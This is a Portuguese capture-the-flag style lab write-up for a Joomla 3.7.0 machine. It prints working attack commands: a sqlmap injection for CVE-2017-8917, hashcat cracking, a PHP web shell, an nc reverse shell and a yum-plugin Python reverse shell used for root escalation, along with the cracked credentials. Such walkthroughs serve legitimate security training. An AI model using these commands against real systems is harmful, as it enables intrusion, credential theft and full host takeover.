EHPT - DareDevil

# EHPT - DareDevil

## Enumeração

### Scan inicial

- Full NMAP scan TCP

  ```
  # Nmap 7.80 scan initiated Sun Jun 21 13:13:41 2020 as: nmap -sC -sV -oA quick 172.16.0.129
  Nmap scan report for 172.16.0.129
  Host is up (0.65s latency).
  Not shown: 996 filtered ports
  PORT     STATE  SERVICE    VERSION
  22/tcp   open   ssh        OpenSSH 8.0 (protocol 2.0)
  | ssh-hostkey: 
  |   3072 4a:9f:3f:71:3e:d0:a3:81:5b:54:04:14:54:b4:e6:0a (RSA)
  |   256 33:4b:af:35:6e:1a:c0:f9:73:d4:9f:29:fa:a2:35:af (ECDSA)
  |_  256 1a:a0:ed:a2:2a:c7:ee:4c:47:ef:1b:80:7a:de:dc:a0 (ED25519)
  80/tcp   open   http       Apache httpd 2.4.37 ((centos))
  |_http-generator: Joomla! - Open Source Content Management
  | http-robots.txt: 15 disallowed entries 
  | /joomla/administrator/ /administrator/ /bin/ /cache/ 
  | /cli/ /components/ /includes/ /installation/ /language/ 
  |_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
  |_http-server-header: Apache/2.4.37 (centos)
  |_http-title: Home
  443/tcp  closed https
  9090/tcp closed zeus-admin
  
  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  # Nmap done at Sun Jun 21 13:15:01 2020 -- 1 IP address (1 host up) scanned in 80.23 seconds
  ```

### 80/TCP - HTTP

- Analisando a porta 80/TCP, notado que existe um serviço HTTP em execução com o serviço de CMS Joomla

- Para enumerção utilizado script Joomscan que lista, dentre outras informações, qual a versão do CMS utilizada

  ```
                                                                                                                                                                                      [46/46]
      ____  _____  _____  __  __  ___   ___    __    _  _ 
     (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
    .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
    \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
                          (1337.today)           
                                 
      --=[OWASP JoomScan                                                                        
      +---++---==[Version : 0.0.7                                                               
      +---++---==[Update Date : [2018/09/23]
      +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
      --=[Code name : Self Challenge             
      @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP
                                                 
  Processing http://172.16.0.129 ...             
                                                 
                                                 
                                                 
  [+] FireWall Detector                          
  [++] Firewall not detected     
                                                 
  [+] Detecting Joomla Version                   
  [+ Joomla 3.7.0         
  ```



## Exploração

## CVE-2017-8917

- Após execução do Joomscan,  identificado que a versão em uso é a 3.7.0, a qual possui uma vulnerabilidade de SQL Injection

  ```
  dcruz@kali:/dcruz/ehpt/daredevil/scan$ searchsploit joomla 3.7.0
  ------------------------------------------------------------ ---------------------------------
   Exploit Title                                              |  Path
  ------------------------------------------------------------ ---------------------------------
  Joomla! 3.7.0 - 'com_fields' SQL Injection                  | php/webapps/42033.txt
  Joomla! Component Easydiscuss < 4.0.21 - Cross-Site Scripti | php/webapps/43488.txt
  ------------------------------------------------------------ ---------------------------------
  Shellcodes: No Results
  ```

  ```
  URL Vulnerable: http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27
  
  Using Sqlmap: 
  
  sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
  
  available databases [5]:
  [*] information_schema
  [*] joomla_db
  [*] joomla_DB
  [*] mysql
  [*] performance_schema
  
  Database: joomla_DB                         
  Table: s62u1_users                        
  [1 entry]                                
  +----------+--------------------------------------------------------------+
  | username | password                                                     |
  +----------+--------------------------------------------------------------+
  | murdock  | $2y$10$cPtYaw48tjJUxlhiQKZsFuPROWSKkExNm8KlGapSUWd3x7IGtA57u |
  +----------+--------------------------------------------------------------+
  
  Table: bak_#__users
  [1 entry]
  +----------+--------------------------------------------------------------+
  | username | password                                                     |
  +----------+--------------------------------------------------------------+
  | murdock  | $2y$10$Mi96NMozkzN9U3J/yOwZ/eBY3Pi8P5c5f2eTafxFylU/oW8d56v9G |
  +----------+--------------------------------------------------------------+
  ```

- Utilizando o SQLmap, listado o username e hash de senha do usuário, o qual foi possível quebrar utilizando o hashcat conforme comandos abaixo

  ```
  hashcat -m3200 hash /usr/shared/wordlists/rockyou --force
  
  hashcat -m3200 hash --show
  $2y$10$Mi96NMozkzN9U3J/yOwZ/eBY3Pi8P5c5f2eTafxFylU/oW8d56v9G:letmein
  $2y$10$cPtYaw48tjJUxlhiQKZsFuPROWSKkExNm8KlGapSUWd3x7IGtA57u:letmein
  ```

- Com a senha do adminitrador murdock, acessado o painel administrativo do joomla e configurado, no lugar da pagina error.php, um shell para execução remota

  ```php
  <?php system($_GET['cmd']);?>
  ```

- A partir desta pagina, que se encontra no caminho /templates/protostar/error.php foi possível obter execução remota ao passar o comando na variavel get, conforme acima criado

  ![image-20200622181255650](C:\Temp\EHPT\DareDevil.assets\image-20200622181255650.png)

- A partir desta execução, obtido shell reverso enviando o seguinte comando

  ```
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.16.0.128 4443 >/tmp/f
  ```

- A partir da conta apache, a qual foi a conta com que foi obtido o shell, realizada a enumerção da maquina, iniciando pelas credenciais do banco de dados, porem esta senha nao funcionou para o usuário root

  ```
  public $user = 'root';         
  public $password = 'thebigbangtheory';
  public $db = 'joomla_db';    
  ```

- Para enumerar os users da maquina, executado o comando users e o usuário usuário retornado foi o murdock, para o qual foi tentada a senha obtida e houve êxito, obtendo a flag de user

  ```
  [murdock@localhost ~]$ cat user.txt 
  0584f2d8a427826209eac4de5a12596a
  ```

  

## Escalação de Privilégios

- Ao acessar com o usuário murdock, uma vez que se tem a sua senha, executado o comando sudo -l e validado que  mesmo pode executar o comando yum com permissões administrativas

  ```
  [murdock@localhost ~]$ sudo -l
  Entradas de Defaults correspondentes a murdock em localhost:
      !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR
      USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
      env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
  
  Usuário murdock pode executar os seguintes comandos em localhost:
      (root) NOPASSWD: /usr/bin/yum
  [murdock@localhost ~]$      
  ```

- Pesquisando no GTFOBins, validado que é possivel escalar utilizando um plugin ou rpm crafted. o seguinte procedimento foi realizado que envia um shell reverso como root

  ```
  TF=$(mktemp -d)
  cat >$TF/x<<EOF
  [main]
  plugins=1
  pluginpath=$TF
  pluginconfpath=$TF
  EOF
  
  cat >$TF/y.conf<<EOF
  [main]
  enabled=1
  EOF
  
  cat >$TF/y.py<<EOF
  import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.0.128",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
  EOF
  
  sudo yum -c $TF/x --enableplugin=y
  ```

- Após este procedimento, obtido flag root

  ```
  sh-4.4#cat root.txt
  cat root.txt
  54d22dbab9a3f1ed0f82a774daccc0ab
  sh-4.4#
  ```

  